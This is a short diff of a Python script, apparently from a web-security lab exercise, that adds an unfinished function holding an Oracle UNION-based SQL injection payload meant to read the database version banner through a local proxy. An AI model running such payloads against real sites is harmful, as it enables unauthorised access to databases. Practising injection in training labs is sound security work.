@@ -14,6 +14,10 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
+def exploit_sqli_version(url):
+    path = 'filter?category=Lifestyle'
+    sql_payload = 'UNION SELECT banner,NULL from v$version--' #we must use the oracle format
+    
 if __name__=="__main__":
     try:
         url = sys.argv[1].strip()
